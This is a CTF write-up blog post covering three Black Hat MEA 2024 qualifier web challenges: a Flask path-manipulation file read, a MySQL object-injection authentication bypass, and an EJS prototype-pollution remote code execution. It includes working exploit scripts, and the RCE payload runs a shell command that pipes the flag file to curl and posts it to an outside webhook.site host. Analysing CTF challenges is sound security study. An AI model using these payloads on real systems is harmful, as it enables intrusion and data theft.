---
title:  "BLACK HAT MEA CTF QUALS 2024 WEB CHALLENGES WRITEUP"
description: WEB WRITEUP FOR BLACK HAT QUALS 2024
image: 
  path: /assets/img/blog/blackhat/wolv_black_hat.jpg
tags: [ctf,sql_injection,web,Object_Injection]
date:   2024-07-28 13:49:56 +0300
categories: [CTFs]
---
Hi I am Mohammed Ashraf AKA logan0x
and this is my Writeup for BlackHat Mea Web Challenges

## 1. Watermelon
### Description
```
All love for Watermelons 🍉🍉🍉

Note: The code provided is without jailing, please note that when writing exploits.
```

### Source Code
```python
from flask import Flask, request, jsonify, session, send_file
from functools import wraps
from flask_sqlalchemy import SQLAlchemy
import os, secrets
from werkzeug.utils import secure_filename



app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///db.db' 
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = secrets.token_hex(20)
app.config['UPLOAD_FOLDER'] = 'files'


db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(120), nullable=False)

class File(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    filename = db.Column(db.String(255), nullable=False)
    filepath = db.Column(db.String(255), nullable=False)
    uploaded_at = db.Column(db.DateTime, nullable=False, default=db.func.current_timestamp())
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)

    user = db.relationship('User', backref=db.backref('files', lazy=True))


def create_admin_user():
    admin_user = User.query.filter_by(username='admin').first()
    if not admin_user:
        admin_user = User(username='admin', password= secrets.token_hex(20))
        db.session.add(admin_user)
        db.session.commit()
        print("Admin user created.")
    else:
        print("Admin user already exists.")

with app.app_context():
    db.create_all()
    create_admin_user()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session or 'user_id' not in session:
            return jsonify({"Error": "Unauthorized access"}), 401
        return f(*args, **kwargs)
    return decorated_function


def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session or 'user_id' not in session or not session['username']=='admin':
            return jsonify({"Error": "Unauthorized access"}), 401
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    return 'Welcome to my file sharing API'

@app.post("/register")
def register():
    if not request.json or not "username" in request.json or not "password" in request.json:
        return jsonify({"Error": "Please fill all fields"}), 400
    
    username = request.json['username']
    password = request.json['password']

    if User.query.filter_by(username=username).first():
        return jsonify({"Error": "Username already exists"}), 409

    new_user = User(username=username, password=password)
    db.session.add(new_user)
    db.session.commit()

    return jsonify({"Message": "User registered successfully"}), 201

@app.post("/login")
def login():
    if not request.json or not "username" in request.json or not "password" in request.json:
        return jsonify({"Error": "Please fill all fields"}), 400
    
    username = request.json['username']
    password = request.json['password']

    user = User.query.filter_by(username=username, password=password).first()
    if not user:
        return jsonify({"Error": "Invalid username or password"}), 401
    
    session['user_id'] = user.id
    session['username'] = user.username
    return jsonify({"Message": "Login successful"}), 200

@app.get('/profile')
@login_required
def profile():
    return jsonify({"username": session['username'], "user_id": session['user_id']})

@app.get('/files')
@login_required
def list_files():
    user_id = session.get('user_id')
    files = File.query.filter_by(user_id=user_id).all()
    file_list = [{"id": file.id, "filename": file.filename, "filepath": file.filepath, "uploaded_at": file.uploaded_at} for file in files]
    return jsonify({"files": file_list}), 200


@app.route("/upload", methods=["POST"])
@login_required
def upload_file():
    if 'file' not in request.files:
        return jsonify({"Error": "No file part"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"Error": "No selected file"}), 400
    
    user_id = session.get('user_id')
    if file:
        blocked = ["proc", "self", "environ", "env"]
        filename = file.filename

        if filename in blocked:
            return jsonify({"Error":"Why?"})

        user_dir = os.path.join(app.config['UPLOAD_FOLDER'], str(user_id))
        os.makedirs(user_dir, exist_ok=True)
        

        file_path = os.path.join(user_dir, filename)

        file.save(f"{user_dir}/{secure_filename(filename)}")
        

        new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)
        db.session.add(new_file)
        db.session.commit()
        
        return jsonify({"Message": "File uploaded successfully", "file_path": file_path}), 201

    return jsonify({"Error": "File upload failed"}), 500

@app.route("/file/<int:file_id>", methods=["GET"])
@login_required  
def view_file(file_id):
    user_id = session.get('user_id')
    file = File.query.filter_by(id=file_id, user_id=user_id).first()

    if file is None:
        return jsonify({"Error": "File not found or unauthorized access"}), 404
    
    try:
        return send_file(file.filepath, as_attachment=True)
    except Exception as e:
        return jsonify({"Error": str(e)}), 500


@app.get('/admin')
@admin_required
def admin():
    return os.getenv("FLAG","BHFlagY{testing_flag}")



if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

### Solution

The challenge is a simple lfd vulnertability because of file upload function weakness. Also the challenge does not have any ui so we have to use curl of burp to interact with the challenge.

Here is the interesting code snippet
```python
@app.route("/upload", methods=["POST"])
@login_required
def upload_file():
    if 'file' not in request.files:
        return jsonify({"Error": "No file part"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"Error": "No selected file"}), 400
    
    user_id = session.get('user_id')
    if file:
        blocked = ["proc", "self", "environ", "env"]
        filename = file.filename

        if filename in blocked:
            return jsonify({"Error":"Why?"})

        user_dir = os.path.join(app.config['UPLOAD_FOLDER'], str(user_id))
        os.makedirs(user_dir, exist_ok=True)
        

        file_path = os.path.join(user_dir, filename)

        file.save(f"{user_dir}/{secure_filename(filename)}")
        

        new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)
        db.session.add(new_file)
        db.session.commit()
        
        return jsonify({"Message": "File uploaded successfully", "file_path": file_path}), 201

    return jsonify({"Error": "File upload failed"}), 500
```

1. Insufficient Filename Validation:
  - code checks the filename against a list of blocked keywords (`blocked = ["proc", "self", "environ", "env"]`), but this check is too simplistic

2. Improper use of secure_filename():

  - The code uses secure_filename() when saving the file, but not when constructing the file_path, but not when constructing the file_path
  ```python 
  file_path = os.path.join(user_dir, filename)
file.save(f"{user_dir}/{secure_filename(filename)}")
```
  
  - The function `secure_filename()` is used to sanitize the filename, for example it removers the `../` from file name
  
  ```python

  from werkzeug.utils import secure_filename

filename = "../../../etc/passwd"
safe_filename = secure_filename(filename)
print(safe_filename) //etc_passwd
```

3. Improper use of os.path.join():

  - The code uses os.path.join() to construct the file_path `file_path = os.path.join(user_dir, filename)` but it does not sanitize the filename, so if we upload a file with a filename like `/etc/passwd`, file_path will be `/etc/passwd`.
  
  Here is a small snippet to understand the issue
```python

import os

user_dir = "/home/user/uploads"
filename = "/app/db.db"

file_path = os.path.join(user_dir, filename)
print(file_path) #/app/db.db
```

4. Saving the file path in the database differ from the actual file path:

  - The code saves the file in the server using this line `file.save(f"{user_dir}/{secure_filename(filename)}")` so if the we set the file name to be `/etc/passwd` the `file_path` variable will be `/etc/passwd` but when the when this passed to `secure_filename` it will be `etc_passwd` so we will not override any files.

  - The code saves the file path in the database using this line `new_file = File(filename=secure_filename(filename), filepath=file_path, user_id=user_id)`, so the file path in the database will be our the file_path variable without any modification by `secure_filename` function.


#### Exploitation:
To exploit this, we could:

- Upload a file with a name like "/etc/passwd"
- The file would be saved safely due to secure_filename(), but the path in the database would contain the malicious path.
- in a subsequent request to the endpoint `/file/<int:file_id>` which sends us the file based on the `file_path` in the database, it will return the content of the file `/etc/passwd` because the file path in the database is `/etc/passwd` and the file is saved in the server with the name `etc_passwd`

![alt text](<../assets/img/blog/blackhat/watermelone/INJECT.png>)

Then get the file id :
![alt text](<../assets/img/blog/blackhat/watermelone/ID.png>)

Then get the file content:
![alt text](<../assets/img/blog/blackhat/watermelone/READ.png>)

WE GET THE ADMIN PASSWORD, LETS LOGIN AS ADMIN AND GET THE FLAG
![alt text](<../assets/img/blog/blackhat/watermelone/FLAG.png>)




## 2. Notey

### Description
```
I created a note sharing website for everyone to talk to themselves secretly. Don't try to access others notes, grass isn't greener :'( )
```

### Directory Structure
```
.
├── src
│   ├── node_modules
│   ├── database.js
│   ├── index.js
│   ├── middlewares.js
│   ├── package-lock.json
│   ├── package.json
│
├── build.sh
├── docker-compose.yml
├── docker-entrypoint.sh
├── Dockerfile
├── hook.sh
├── init.db
└── init.sh
```

### Source Code
index.js:
```js
const express = require('express');
const bodyParser = require('body-parser');
const crypto=require('crypto');
var session = require('express-session');
const db = require('./database');
const middleware = require('./middlewares');

const app = express();


app.use(bodyParser.urlencoded({
extended: true
}))

app.use(session({
    secret: crypto.randomBytes(32).toString("hex"),
    resave: true,
    saveUninitialized: true
}));



app.get('/',(req,res)=>{
    res.send("Welcome")
})

app.get('/profile', middleware.auth, (req, res) => {
    const username = req.session.username;

    db.getNotesByUsername(username, (err, notes) => {
    if (err) {
        return res.status(500).json({ error: 'Internal Server Error' });
    }   
    res.json(notes);
    });
});

app.get('/viewNote', middleware.auth, (req, res) => {
    const { note_id,note_secret } = req.query;

    if (note_id && note_secret){
        db.getNoteById(note_id, note_secret, (err, notes) => {
            if (err) {
            return res.status(500).json({ error: 'Internal Server Error' });
            }
            return res.json(notes);
        });
    }
    else
    {
        return res.status(400).json({"Error":"Missing required data"});
    }
});


app.post('/addNote', middleware.auth, middleware.addNote, (req, res) => {
    const { content, note_secret } = req.body;
        db.addNote(req.session.username, content, note_secret, (err, results) => {
            if (err) {
            return res.status(500).json({ error: 'Internal Server Error' });
            }
    
            if (results) {
            return res.json({ message: 'Note added successful' });
            } else {
            return res.status(409).json({ error: 'Something went wrong' });
            }
        });
});


app.post('/login', middleware.login, (req, res) => {
const { username, password } = req.body;

    db.login_user(username, password, (err, results) => {
        if (err) {
        console.log("req ",req.session);
        console.log(err);
        return res.status(500).json({ error: 'Internal Server Error' });
        }

        if (results.length > 0) {
        console.log("sec",req.session);
        req.session.username = username;
        return res.json({ message: 'Login successful' });
        } else {
        console.log(req.session);
        return res.status(401).json({ error: 'Invalid username or password' });
        }
    });
}); 

app.post('/register', middleware.login, (req, res) => {
const { username, password } = req.body;

    db.register_user(username, password, (err, results) => {
        if (err) {
        return res.status(500).json({ error: 'Internal Server Error' });
        }

        if (results) {
        return res.json({ message: 'Registration successful' });
        } else {
        console.log(req.session);
        return res.status(409).json({ error: 'Username already exists' });
        }
    });
});

db.wait().then(() => {
    db.insertAdminUserOnce((err, results) => {
        if (err) {
            console.error('Error:', err);
        } else {
            db.insertAdminNoteOnce((err, results) => {
                if (err) {
                    console.error('Error:', err);
                } else {
                    app.listen(3000, () => {
                        console.log('Server started on http://localhost:3000');
                    });
                }
            });
        }
    });
});
```

middlewares.js:
```js
const auth = (req, res, next) => {
    ssn = req.session
    console.log(ssn)
    if (ssn.username) {
        return next();
    } else {
        return res.status(401).send('Authentication required.');
    }
};


const login = (req,res,next) =>{
    const {username,password} = req.body;
    if ( !username || ! password )
    {
        return res.status(400).send("Please fill all fields");
    }
    else if(typeof username !== "string" || typeof password !== "string")
    {
        return res.status(400).send("Wrong data format");
    }
    next();
}

const addNote = (req,res,next) =>{
    const { content, note_secret } = req.body;
    if ( !content || ! note_secret )
    {
        return res.status(400).send("Please fill all fields");
    }
    else if(typeof content !== "string" || typeof note_secret !== "string")
    {
        return res.status(400).send("Wrong data format");
    }
    else if( !(content.length > 0 && content.length < 255) ||  !( note_secret.length >=8 && note_secret.length < 255) )
    {
        return res.status(400).send("Wrong data length");
    }
    next();
}

module.exports ={
    auth, login, addNote
};
```
database.js:
```js
const mysql = require('mysql');
const crypto=require('crypto');


const pool = mysql.createPool({
  host: '127.0.0.1',
  user: 'root',
  password: '',
  database: 'CTF',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
});

// One liner to wait a second
async function wait() {
  await new Promise(r => setTimeout(r, 1000));
}

function insertAdminUserOnce(callback) {
  const checkUserQuery = 'SELECT COUNT(*) AS count FROM users WHERE username = ?';
  const insertUserQuery = 'INSERT INTO users (username, password) VALUES (?, ?)';
  const username = 'admin';
  const password = crypto.randomBytes(32).toString("hex");

  pool.query(checkUserQuery, [username], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      callback(err, null);
      return;
    }

    const userCount = results[0].count;

    if (userCount === 0) {
      pool.query(insertUserQuery, [username, password], (err, results) => {
        if (err) {
          console.error('Error executing query:', err);
          callback(err, null);
          return;
        }
        console.log(`Admin user inserted successfully with this passwored ${password}.`);
        callback(null, results);
      });
    } else {
      console.log('Admin user already exists. No insertion needed.');
      callback(null, null);
    }
  });
}

function insertAdminNoteOnce(callback) {
  const checkNoteQuery = 'SELECT COUNT(*) AS count FROM notes WHERE username = "admin"';
  const insertNoteQuery = 'INSERT INTO notes(username,note,secret)values(?,?,?)';
  const flag = process.env.DYN_FLAG || "placeholder";
  const secret = crypto.randomBytes(32).toString("hex");

  pool.query(checkNoteQuery, [], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      callback(err, null);
      return;
    }

    const NoteCount = results[0].count;

    if (NoteCount === 0) {
      pool.query(insertNoteQuery, ["admin", flag, secret], (err, results) => {
        if (err) {
          console.error('Error executing query:', err);
          callback(err, null);
          return;
        }
        console.log(`Admin Note inserted successfully with this secret ${secret}`);
        callback(null, results);
      });
    } else {
      console.log('Admin Note already exists. No insertion needed.');
      callback(null, null);
    }
  });
}


function login_user(username,password,callback){

  const query = 'Select * from users where username = ? and password = ?';
  
  pool.query(query, [username,password], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      callback(err, null);
      return;
    }
    callback(null, results);
  });
}

function register_user(username, password, callback) {
  const checkUserQuery = 'SELECT COUNT(*) AS count FROM users WHERE username = ?';
  const insertUserQuery = 'INSERT INTO users (username, password) VALUES (?, ?)';

  pool.query(checkUserQuery, [username], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      callback(err, null);
      return;
    }

    const userCount = results[0].count;

    if (userCount === 0) {
      pool.query(insertUserQuery, [username, password], (err, results) => {
        if (err) {
          console.error('Error executing query:', err);
          callback(err, null);
          return;
        }
        console.log('User registered successfully.');
        callback(null, results);
      });
    } else {
      console.log('Username already exists.');
      callback(null, null);
    }
  });
}


function getNotesByUsername(username, callback) {
  const query = 'SELECT note_id,username,note FROM notes WHERE username = ?';
  pool.query(query, [username], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      callback(err, null);
      return;
    }
    callback(null, results);
  });
}

function getNoteById(noteId, secret, callback) {
  const query = 'SELECT note_id,username,note FROM notes WHERE note_id = ? and secret = ?';
  console.log(noteId,secret);
  pool.query(query, [noteId,secret], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      callback(err, null);
      return;
    }
    callback(null, results);
  });
}

function addNote(username, content, secret, callback) {
  const query = 'Insert into notes(username,secret,note)values(?,?,?)';
  pool.query(query, [username, secret, content], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      callback(err, null);
      return;
    }
    callback(null, results);
  });
}


module.exports = {
  getNotesByUsername, login_user, register_user, getNoteById, addNote, wait, insertAdminNoteOnce, insertAdminUserOnce
};
```

From the function `insertAdminNoteOnce` in database.js, we can see that the flag is stored in the database with the username `admin` and a random secret. The flag is stored in the `note` column, so to get the flag, we need to get the note with the username `admin` and `id` which is not known to us and the secret which is random.

To get any note, there are two ways: either by the `note_id` and `note_secret` which can be done through the endpoint `/viewNote`, or by the username in the session cookies which can be accessed via the endpoint `/profile`. However, it's important to note that there is no Frontend for the challenge, so we have to use curl or burp to interact with the challenge.


### Solution:

#### THE SECRET BEHIND 66

This challenge was particularly mind-boggling, and I spent a considerable amount of time trying to find a way to get the flag. Initially, I couldn't find a way to get the secret, so I decided to investigate the `init.db` file. To my surprise, I discovered that the `id` column is auto-incremented but starts from 66, which means the admin note id is 66 as it's the first note in the database.

![alt text](<../assets/img/blog/blackhat/notey/initdb.png>)

This discovery narrowed down my approach to getting the flag by the `note_id` and `note_secret` using the endpoint `/viewNote`. Nevertheless, I still couldn't find a way to get the secret as it's randomly generated.

#### Short explanation of the exploit:

The exploit relies on three key factors:
- The `note_id` is known to be 66
- The `note_secret` is random
- We can inject an object in the `note_secret` field to get the flag

The exploit can be executed using the following URL:
`/viewNote?note_id=66&secret[note_id]=0`

In this exploit, the `secret` is an object that contains the key `note_id` with the value 0. Consequently, the SQL query will look like this:

```sql
SELECT note_id, username, note FROM notes WHERE note_id = 66 AND secret = `note_id` = '0'
```


Let's break down what happens in this query:

- `note_id = 66`: This condition is straightforward and will select rows where note_id is equal to 66.

- ``` secret = `note_id` = '0' ```: This part is more complex and involves some SQL logic:

  - SQL evaluates expressions from left to right. So, the expression `secret = `` `note_id` `` = '0'` is interpreted as ``` (secret = `note_id`) = '0' ```.
   
  - The expression ```secret = `note_id` ```  will return a boolean value (1 for true, 0 for false) depending on whether the value of secret is equal to the value of the corresponding row of the `note_id` column. In our case, it will return 0 as the `secret` is not equal to `note_id` in any row because the secret is 32 random length.
   
  The previous comparison will be done for every row in the database, comparing the `secret` and `note_id` columns. To illustrate this, let's assume we have a database with the following sample data:

  | note_id | secret                           |
  |---------|----------------------------------|
  | 66      | a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 |
  | 67      | q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2 |
  | 68      | g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8 |

  For each row, the comparison ```secret = `note_id` ``` will be evaluated:

  1. For note_id 66: 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6' = '66' (false, returns 0)
  2. For note_id 67: 'q7r8s9t0u1v2w3x4y5z6a7b8c9d0e1f2' = '67' (false, returns 0)
  3. For note_id 68: 'g3h4i5j6k7l8m9n0o1p2q3r4s5t6u7v8' = '68' (false, returns 0)

  In all cases, this comparison returns 0 (false) because the secret is a 32-character string that doesn't match the note_id.

  - Since '0' is a string and 1 or 0 (which maybe returned by the expression ```secret = `note_id` ```) are integers, the comparison will treat '0' as an integer. So, the expression ``` (secret = `note_id`) = '0' ``` will check if the result of ``` secret = `note_id` ``` is equal to the integer 0 for each row.
   
  - Therefore, the condition ``` (secret = `note_id`) = '0' ``` is now effectively `0=0`.

As a result, the query will select rows where `note_id` is 66 and `0=0`. This condition will always be true, thus returning the flag.

To further illustrate this concept, here's an example using an online MySQL compiler:

![alt text](<../assets/img/blog/blackhat/notey/online.png>)

![alt text](<../assets/img/blog/blackhat/notey/on2.png>)


This third image illustrates the same concept but this time there are two rows which will make the expression ``` dept = `name` ``` returns 1 so the only row will be returned is the third one.

![alt text](<../assets/img/blog/blackhat/notey/on3.png>)

To confirm how my exploitation request is interpreted by the database, I also checked my `mysql` logs. Here's the exploitation request:

![alt text](<../assets/img/blog/blackhat/notey/local.png>)


### Getting the flag
we need to be fast when getting the flag as the server was restarting every few seconds, so we need to write a script to get the flag as soon as the server starts.

```python
from requests import Session

s = Session()
login_url = "http://a233af04b075fbec51200.playat.flagyard.com/login"
note_url = "http://a233af04b075fbec51200.playat.flagyard.com/viewNote"
creds = {"username": "logan0x", "password": "logan0x"}
note_params = {"note_id": 66, "note_secret[note_id]": 0}
print(s.get(note_url, params=note_params).text)
```


### Long explanation of the exploit:

for Long explanation of the issue reason you can check this [https://gccybermonks.com/posts/obji2sqli/](https://gccybermonks.com/posts/obji2sqli/)


3. Fastest Delivery Service

### Description
```
No time for description, I had some orders to deliver : D 
Note: The code provided is without jailing, please note that when writing exploits.

```

Directory Structure:
```
.
├── app.js
├── controllers
│   ├── adminController.js
│   ├── authController.js
│   └── orderController.js
├── data
│   └── dataStore.js
├── docker-compose.yml
├── Dockerfile
├── ex.py
├── middlewares
│   └── auth.js
├── package-lock.json
├── package.json
├── routes
│   ├── admin.js
│   ├── auth.js
│   └── order.js
└── views
    ├── address.ejs
    ├── admin.ejs
    ├── index.ejs
    ├── login.ejs
    ├── order.ejs
    └── register.ejs

```

### Source Code

As the there is a lot of code, I will only show the important parts of the code.

app.js:
```js
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const crypto = require("crypto");

const app = express();
const PORT = 3000;

// In-memory data storage
let users = {};
let orders = {};
let addresses = {};

// Inserting admin user
users['admin'] = { password: crypto.randomBytes(16).toString('hex'), orders: [], address: '' };
console.log("users object : ", users);
// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.set('view engine', 'ejs');
app.use(session({
    secret: crypto.randomBytes(16).toString('hex'),
    resave: false,
    saveUninitialized: true
}));

// Routes
app.get('/', (req, res) => {
    res.render('index', { user: req.session.user });
});
app.get('/login', (req, res) => {
    res.render('login');
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    console.log(req.body);
    const user = users[username];
    console.log("user" ,user);
    console.log("users object when logging in : ", users);

    if (user && user.password === password) {
        req.session.user = { username };
        res.redirect('/');
    } else {
        res.send('Invalid credentials. <a href="/login">Try again</a>.');
    }
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

app.get('/register', (req, res) => {
    res.render('register');
});

app.post('/register', (req, res) => {
    const { username, password } = req.body;

    if (Object.prototype.hasOwnProperty.call(users, username)) {
        res.send('Username already exists. <a href="/register">Try a different username</a>.');
    } else {
        users[username] = { password, orders: [], address: '' };
        req.session.user = { username };
        res.redirect(`/address`);
    }
});

app.get('/address', (req, res) => {
    const { user } = req.session;
    if (user && users[user.username]) {
        res.render('address', { username: user.username });
    } else {
        res.redirect('/register');
    }
});

app.post('/address', (req, res) => {
    const { user } = req.session;
    const { addressId, Fulladdress } = req.body;

    if (user && users[user.username]) {
        console.log("address object : ", addresses);
        addresses[user.username][addressId] = Fulladdress;
        users[user.username].address = addressId;
        res.redirect('/login');
    } else {
        res.redirect('/register');
    }
});



app.get('/order', (req, res) => {
    if (req.session.user) {
        res.render('order');
    } else {
        res.redirect('/login');
    }
});

app.post('/order', (req, res) => {
    if (req.session.user) {
        const { item, quantity } = req.body;
        const orderId = `order-${Date.now()}`;
        orders[orderId] = { item, quantity, username: req.session.user.username };
        users[req.session.user.username].orders.push(orderId);
        res.redirect('/');
    } else {
        res.redirect('/login');
    }
});

app.get('/admin', (req, res) => {
    if (req.session.user && req.session.user.username === 'admin') {
        const allOrders = Object.keys(orders).map(orderId => ({
            ...orders[orderId],
            orderId
        }));
        res.render('admin', { orders: allOrders });
    } else {
        res.redirect('/');
    }
});


// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
```

### Solution

This challenge is about server-side prototype pollution.

Breakdown the code:

The code uses express-session for managing session cookies. This can be seen in the following lines:

``` js
const session = require('express-session');

// ...

app.use(session({
    secret: crypto.randomBytes(16).toString('hex'),
    resave: false,
    saveUninitialized: true
}));
```

1. The code sets up an Express.js application with necessary middleware:

  - bodyParser for parsing request bodies
  - express-session for managing user sessions
  - EJS as the view engine

2. In-memory data storage is initialized for users, orders, and addresses.

3. An admin user is created with a random password.

4. Routes are defined for various endpoints:

  - '/' (home)
  - '/login'
  - '/logout'
  - '/register'
  - '/address'
  - '/order'
  - '/admin'
5. Each route has corresponding GET and/or POST handlers.


EJS is used to render dynamic content in HTML templates. For example:
`res.render('index', { user: req.session.user });`
This renders the 'index' template and passes the user data to it.

#### The parts in interest:

- For user registration:

  - The /register POST endpoint handles new user creation.
  - The line responsible for saving the user account if not already registered  is: `users[username] = { password, orders: [], address: '' };`
  - The user is then stored in the session with: `req.session.user = { username };`
  - Then the user is redirected to the /address route.



- /address:

  - The GET route checks if the user is logged in and renders the 'address' template if so.
  - The POST route handles saving the user's address: `addresses[user.username][addressId] = Fulladdress;
users[user.username].address = addressId;` This line creates a nested structure in the addresses object. It stores the full address (`Fulladdress`) under a specific addressId for the current user. This allows a user to potentially have multiple addresses, each with a unique identifier. The `addressId` and `Full address` are being taken from the request body but the `usernaeme` is taken from the session.


#### Exploitation
if you are familiar with the prototype pollution attack, you will notice that the code is vulnerable to prototype pollution vulnerability. First occurrence of this vulnerability is in the `/register` endpoint because the code is using the `users` object directly without any sanitization or validation. This allows me to modify the `users` object's prototype, so because of this line `users[username] = { password, orders: [], address: '' };` I can add a new property or change existing one of the `users` object's prototype.


The second occurrence of this vulnerability is in the `/address` endpoint. This is because the code is using the `addresses` object directly without any sanitization or validation. This allows me to modify the `addresses` object's prototype, so because of this line `addresses[user.username][addressId] = Fulladdress;` we can add a new property or change existing one of the `addresses` object's prototype.


#### The journey of searching for a gadget :

A gadget is a piece of code that can be leveraged to perform specific actions when triggered by the vulnerability. In prototype pollution, a gadget is typically a function or code path that uses object properties in a way that can be manipulated through pollution.

In this challenge, I needed to find a gadget that would allow me to execute code by manipulating the `users` and `addresses` object's prototype. I started by looking for a gadget in the codebase that would allow me to get RCE, The reason I was looking for a gadget that would allow me to get RCE is because I wanted to be able to execute code on the server because the the flag is being created in the server using that docker line `RUN echo "$FLAG" > '/tmp/flag_'$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32).txt` which means the flag is in the /tmp directory and starts with the flag_ and ends with a random string of 32 characters.

The app uses EJS as the view engine so it's perfect to be my gadget to achieve RCE.

This blog post is a great resource for understanding how to use EJS to achieve RCE: https://blog.huli.tw/2023/06/22/en/ejs-render-vulnerability-ctf/

so first we need to pollute the prototype by modifying a property in it called `client` and give the value `1` to it.

then we need to modify the `escapeFunction` property with the value `JSON.stringify; process.mainModule.require('child_process').exec('cat /tmp/flag*.txt | curl -X POST -d @- https://webhook.site/xxxxxxxxx')` to read the flag and send it to the webhook.site.

then we need to trigger the `render` function from the `ejs` module, we can do that by visiting the `/`.

### Exploit

1 - First we need to register an account with the username `__proto__`, the reason behind that is because the way address is being saved in the `/address` endpoint, it's being saved in the `addresses` object with the username from the session as one the keys, so if we register an account with the username `__proto__` we can pollute the prototype of the `addresses` object.

![alt text](<../assets/img/blog/blackhat/fds/reg.png>)

2 - Starting of the changing the two properties in interest which are `client` and `escapeFunction`. Polluting client with the value `1`:

![alt text](<../assets/img/blog/blackhat/fds/clients.png>)

3- Polluting the `escapeFunction` with the value `JSON.stringify; process.mainModule.require('child_process').exec('cat /tmp/flag*.txt | curl -X POST -d @- https://webhook.site/xxxxxxxxx')`:

![alt text](<../assets/img/blog/blackhat/fds/escape.png>)

4 - visit the `/` endpoint to trigger the `render` function from the `ejs` module

> Because the server was restarting every few seconds, I had to write a script to automate the process of getting the flag as soon as the server starts.

```python
import requests

# Define the base URL
base_url = "http://ac32871125f6bfce44af2.playat.flagyard.com"

# Common headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://localhost:3000",
    "Connection": "keep-alive",
    "Referer": "http://localhost:3000/address",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "X-PwnFox-Color": "green",
    "Priority": "u=0, i"
}

# Proxy configuration
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Create a session object
session = requests.Session()

# Function to send a POST request using the session
def send_post_request(url, data):
    response = session.post(url, headers=headers, data=data, allow_redirects=False, proxies=proxies)
    return response

# Function to send a GET request using the session
def send_get_request(url):
    response = session.get(url, headers=headers, allow_redirects=False, proxies=proxies)
    return response

# Register
register_url = f"{base_url}/register"
register_data = "username=__proto__&password=logan0x"
register_response = send_post_request(register_url, register_data)
if register_response.status_code == 302:
    print("Register Redirect Successful")
else:
    print("Register Failed")

# Extract the connect.sid cookie
connect_sid_cookie = None
for cookie in session.cookies:
    if cookie.name == 'connect.sid':
        connect_sid_cookie = cookie
        break

if connect_sid_cookie:
    print(f"Extracted Cookie: {connect_sid_cookie.name}={connect_sid_cookie.value}")
else:
    print("Failed to extract connect.sid cookie")

# GET request to /
root_url = f"{base_url}/"
root_response = send_get_request(root_url)
if root_response.status_code == 200:
    print("Root GET Request Successful")
else:
    print("Root GET Request Failed")

# Address - First Request
address_url = f"{base_url}/address"
address_data_1 = "username=__proto__&addressId=client&Fulladdress=1"
address_response_1 = send_post_request(address_url, address_data_1)
if address_response_1.status_code == 302:
    print("Address First Request Successful")
else:
    print("Address First Request Failed")

# Address - Second Request
address_data_2 = "username=__proto__&addressId=escapeFunction&Fulladdress=JSON.stringify; process.mainModule.require('child_process').exec('cat /tmp/flag*.txt | curl -X POST -d @- https://webhook.site/29b8fbde-348d-41bf-9eec-d7603249be32')"
address_response_2 = send_post_request(address_url, address_data_2)
print(address_response_2.text)
if address_response_2.status_code == 302:
    print(address_response_2.text)
    print("Address Second Request Successful")
else:
    print("Address Second Request Failed")

# GET request to / again
root_response_final = send_get_request(root_url)
if root_response_final.status_code == 200:
    print("Final Root GET Request Successful")
else:
    print("Final Root GET Request Failed")

```

#### flag:

![alt text](<../assets/img/blog/blackhat/fds/flag.png>)




